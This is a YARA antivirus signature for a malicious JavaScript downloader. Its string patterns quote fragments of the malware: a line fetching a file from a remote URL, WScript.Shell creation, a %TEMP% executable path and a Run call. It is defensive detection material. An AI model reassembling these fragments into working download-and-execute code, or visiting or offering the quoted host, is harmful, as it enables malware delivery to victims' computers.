rule sig_20160328_9ed1d9c3ceb2d6eebe3a0ca2eef57f0a {
  meta:
    description = "datamaliciousorder - file 20160328_9ed1d9c3ceb2d6eebe3a0ca2eef57f0a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "00190029e570a3a0096f4f18b015ba7570d2e3bfe9fc13a1361402262fee86b9"

  strings:
    $s1  = "function Iytped() {return Rvnele[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nDfzsQNst.exe\";};" fullword ascii
    $s2  = "Qezqa[Wiybqwb](\"GET\", \"http://rvstuintafel.com/aqp9ik\", false);" fullword ascii
    $s3  = "do {WScript[Jkcjm](Cdztu() * 11)} while (Qezqa[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Rvnele = function Yylgvdgm() {return WScript[Uiqohtmug](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Sjibn(Oidybhplhl, Tqdcqc){return Oidybhplhl - Tqdcqc;};" fullword ascii
    $s6  = "function Gslllerozx(Iezqpts){Rvnele[\"Run\"](Iezqpts, Ccifccr, Ccifccr);};" fullword ascii
    $s7  = "function Kdhri() {return ((Siestzumo == true) && (Siestzumo == Vmpxucoorx)) ? 1 : Ccifccr;};" fullword ascii
    $s8  = "function Odxatq(Rojzr) {var Upsxgkve = (1, 2, 3, 4, 5, Rojzr); return Upsxgkve;};" fullword ascii
    $s9  = "return Sjibn(Jkstcd, Ysnfsue);" fullword ascii
    $s10 = "var Wqedjg = false;" fullword ascii
    $s11 = "function Cdztu(){return 22;};" fullword ascii
    $s12 = "var Vmpxucoorx = false;" fullword ascii
    $s13 = "Siestzumo = true; " fullword ascii
    $s14 = "function Bxmujiix()" fullword ascii
    $s15 = "var Vrqfel = new this[\"Date\"]();" fullword ascii
    $s16 = "Vmpxucoorx = true; " fullword ascii
    $s17 = "function Pvbjswle(){return Jatqc;};" fullword ascii
    $s18 = "function Tuqmhjm(){return Uiqohtmug;};" fullword ascii
    $s19 = " while (Nynlv){" fullword ascii
    $s20 = "var Siestzumo = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}